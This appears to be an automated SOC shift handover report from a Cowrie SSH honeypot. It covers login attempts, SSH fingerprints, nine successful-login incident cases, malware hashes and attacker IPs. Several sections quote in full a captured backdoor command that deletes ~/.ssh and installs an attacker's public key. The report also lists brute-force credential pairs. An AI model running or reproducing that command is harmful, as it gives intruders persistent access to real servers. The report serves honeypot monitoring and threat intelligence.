# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T07:03:25Z |
| **Shift Time** | 07:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **36** |
| Confirmed Threats | **31** |
| False Positives Filtered | **5** (13.9%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **17** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **27** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **15** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `mysql` | 3 |
| `345gs5662d34` | 3 |
| `Blank` | 2 |
| `Nobody` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 4 |
| `345gs5662d34` | 3 |
| `abcd1234` | 1 |
| `qwerty1` | 1 |
| `12345678` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 4 |
| `345gs5662d34` | `345gs5662d34` | 3 |
| `Nobody` | `abcd1234` | 1 |
| `mysql` | `qwerty1` | 1 |
| `oracle` | `12345678` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Q1W2E3R4` | `35.210.61.208` | 2026-04-05T06:08:08 |
| `root` | `3245gs5662d34` | `35.210.61.208` | 2026-04-05T06:08:12 |
| `root` | `1234567qwerty` | `81.23.173.32` | 2026-04-05T06:13:22 |
| `root` | `3245gs5662d34` | `81.23.173.32` | 2026-04-05T06:13:32 |
| `root` | `22` | `186.235.193.170` | 2026-04-05T06:22:57 |
| `root` | `root2023` | `197.248.8.33` | 2026-04-05T06:32:47 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-04-05T06:32:52 |
| `root` | `123456789abc` | `197.153.57.103` | 2026-04-05T06:33:09 |
| `root` | `3245gs5662d34` | `197.153.57.103` | 2026-04-05T06:33:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **36** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 14 |
| OpenSSH | 13 |
| Go SSH scanner | 2 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 13 | 13 |
| `03a80b21afa8...` | Modern SSH client | 13 | 6 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 13 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 13 | 6 | Modern SSH client |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `35.210.61.208`, `81.23.173.32`, `197.248.8.33`, `197.153.57.103`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **26** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS15169` | Google LLC | 1 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS200475` | ET VESELIN JELQZKOV | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | MEDIUM |
| `AS9365` | its communications Inc. | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | LOW |
| `AS37061` | Safaricom Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f143f9c70e36

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-05 06:08 |
| **Last Seen** | 2026-04-05 06:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:08:08` | `cowrie.session.connect` |
| `2026-04-05 06:08:08` | `cowrie.client.version` |
| `2026-04-05 06:08:08` | `cowrie.client.kex` |
| `2026-04-05 06:08:08` | `cowrie.login.success` |
| `2026-04-05 06:08:09` | `cowrie.session.params` |
| `2026-04-05 06:08:09` | `cowrie.command.input` |
| `2026-04-05 06:08:09` | `cowrie.command.failed` |
| `2026-04-05 06:08:09` | `cowrie.log.closed` |
| `2026-04-05 06:08:09` | `cowrie.session.params` |
| `2026-04-05 06:08:09` | `cowrie.command.input` |
| `2026-04-05 06:08:09` | `cowrie.session.file_download` |
| `2026-04-05 06:08:09` | `cowrie.log.closed` |
| `2026-04-05 06:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfdfc536d1b2

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-05 06:08 |
| **Last Seen** | 2026-04-05 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:08:11` | `cowrie.session.connect` |
| `2026-04-05 06:08:11` | `cowrie.client.version` |
| `2026-04-05 06:08:12` | `cowrie.client.kex` |
| `2026-04-05 06:08:12` | `cowrie.login.success` |
| `2026-04-05 06:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97013f40d8a8

| Field | Detail |
|---|---|
| **Source IP** | `81.23.173[.]32` |
| **First Seen** | 2026-04-05 06:13 |
| **Last Seen** | 2026-04-05 06:13 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:13:21` | `cowrie.session.connect` |
| `2026-04-05 06:13:21` | `cowrie.client.version` |
| `2026-04-05 06:13:21` | `cowrie.client.kex` |
| `2026-04-05 06:13:22` | `cowrie.login.success` |
| `2026-04-05 06:13:22` | `cowrie.session.params` |
| `2026-04-05 06:13:22` | `cowrie.command.input` |
| `2026-04-05 06:13:22` | `cowrie.command.failed` |
| `2026-04-05 06:13:23` | `cowrie.log.closed` |
| `2026-04-05 06:13:23` | `cowrie.session.params` |
| `2026-04-05 06:13:23` | `cowrie.command.input` |
| `2026-04-05 06:13:23` | `cowrie.session.file_download` |
| `2026-04-05 06:13:23` | `cowrie.log.closed` |
| `2026-04-05 06:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.23.173[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.23.173[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5272cd0844

| Field | Detail |
|---|---|
| **Source IP** | `81.23.173[.]32` |
| **First Seen** | 2026-04-05 06:13 |
| **Last Seen** | 2026-04-05 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:13:31` | `cowrie.session.connect` |
| `2026-04-05 06:13:31` | `cowrie.client.version` |
| `2026-04-05 06:13:32` | `cowrie.client.kex` |
| `2026-04-05 06:13:32` | `cowrie.login.success` |
| `2026-04-05 06:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.23.173[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.23.173[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa5065ee5493

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-04-05 06:22 |
| **Last Seen** | 2026-04-05 06:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:22:54` | `cowrie.session.connect` |
| `2026-04-05 06:22:55` | `cowrie.client.version` |
| `2026-04-05 06:22:55` | `cowrie.client.kex` |
| `2026-04-05 06:22:57` | `cowrie.login.success` |
| `2026-04-05 06:22:58` | `cowrie.direct-tcpip.request` |
| `2026-04-05 06:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f799adfaf698

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-04-05 06:32 |
| **Last Seen** | 2026-04-05 06:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:32:46` | `cowrie.session.connect` |
| `2026-04-05 06:32:46` | `cowrie.client.version` |
| `2026-04-05 06:32:46` | `cowrie.client.kex` |
| `2026-04-05 06:32:47` | `cowrie.login.success` |
| `2026-04-05 06:32:47` | `cowrie.session.params` |
| `2026-04-05 06:32:47` | `cowrie.command.input` |
| `2026-04-05 06:32:47` | `cowrie.command.failed` |
| `2026-04-05 06:32:48` | `cowrie.log.closed` |
| `2026-04-05 06:32:48` | `cowrie.session.params` |
| `2026-04-05 06:32:48` | `cowrie.command.input` |
| `2026-04-05 06:32:48` | `cowrie.session.file_download` |
| `2026-04-05 06:32:48` | `cowrie.log.closed` |
| `2026-04-05 06:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7478a6fd1ba3

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-04-05 06:32 |
| **Last Seen** | 2026-04-05 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:32:51` | `cowrie.session.connect` |
| `2026-04-05 06:32:51` | `cowrie.client.version` |
| `2026-04-05 06:32:51` | `cowrie.client.kex` |
| `2026-04-05 06:32:52` | `cowrie.login.success` |
| `2026-04-05 06:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a79d666e209

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-05 06:33 |
| **Last Seen** | 2026-04-05 06:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:33:08` | `cowrie.session.connect` |
| `2026-04-05 06:33:08` | `cowrie.client.version` |
| `2026-04-05 06:33:09` | `cowrie.client.kex` |
| `2026-04-05 06:33:09` | `cowrie.login.success` |
| `2026-04-05 06:33:10` | `cowrie.session.params` |
| `2026-04-05 06:33:10` | `cowrie.command.input` |
| `2026-04-05 06:33:10` | `cowrie.command.failed` |
| `2026-04-05 06:33:10` | `cowrie.log.closed` |
| `2026-04-05 06:33:10` | `cowrie.session.params` |
| `2026-04-05 06:33:10` | `cowrie.command.input` |
| `2026-04-05 06:33:11` | `cowrie.session.file_download` |
| `2026-04-05 06:33:11` | `cowrie.log.closed` |
| `2026-04-05 06:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-753d73820a06

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-05 06:33 |
| **Last Seen** | 2026-04-05 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 06:33:13` | `cowrie.session.connect` |
| `2026-04-05 06:33:13` | `cowrie.client.version` |
| `2026-04-05 06:33:14` | `cowrie.client.kex` |
| `2026-04-05 06:33:14` | `cowrie.login.success` |
| `2026-04-05 06:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.13.165[.]101` | 1 | 2026-04-05 06:09 | 2026-04-05 06:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.165.40[.]167` | 1 | 2026-04-05 07:01 | 2026-04-05 07:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.141.79[.]159` | 1 | 2026-04-05 06:23 | 2026-04-05 06:24 | 110s | 0 | `T1592` | 🟢 LOW |
| `117.245.140[.]245` | 1 | 2026-04-05 05:52 | 2026-04-05 05:53 | 14s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]91` | 1 | 2026-04-05 06:43 | 2026-04-05 06:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.174.95[.]245` | 1 | 2026-04-05 06:04 | 2026-04-05 06:04 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.104[.]208` | 1 | 2026-04-05 05:49 | 2026-04-05 05:49 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.196.21[.]69` | 1 | 2026-04-05 06:06 | 2026-04-05 06:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.255.212[.]178` | 1 | 2026-04-05 06:47 | 2026-04-05 06:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.153.57[.]103` | 1 | 2026-04-05 06:33 | 2026-04-05 06:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.248.8[.]33` | 1 | 2026-04-05 06:32 | 2026-04-05 06:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.4.68[.]73` | 1 | 2026-04-05 06:08 | 2026-04-05 06:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.243[.]58` | 1 | 2026-04-05 05:44 | 2026-04-05 05:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.197.153[.]143` | 1 | 2026-04-05 07:01 | 2026-04-05 07:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.210.61[.]208` | 1 | 2026-04-05 06:08 | 2026-04-05 06:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.88[.]29` | 1 | 2026-04-05 06:42 | 2026-04-05 06:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.57.154[.]146` | 1 | 2026-04-05 05:44 | 2026-04-05 05:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.227.109[.]89` | 1 | 2026-04-05 06:52 | 2026-04-05 06:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.20.146[.]16` | 1 | 2026-04-05 06:23 | 2026-04-05 06:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-04-05 06:42 | 2026-04-05 06:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-04-05 06:28 | 2026-04-05 06:29 | 55s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-05 07:00 | 2026-04-05 07:00 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `117.141.79[.]159` | CN | China Mobile Communications Corporation | **100** ⚠️ | 48 |
| `210.4.68[.]73` | BD | BDCOM Online Limited, Internet Service Provider, Dhaka, Bangladesh | **100** ⚠️ | 50 |
| `185.196.21[.]69` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `14.103.117[.]91` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
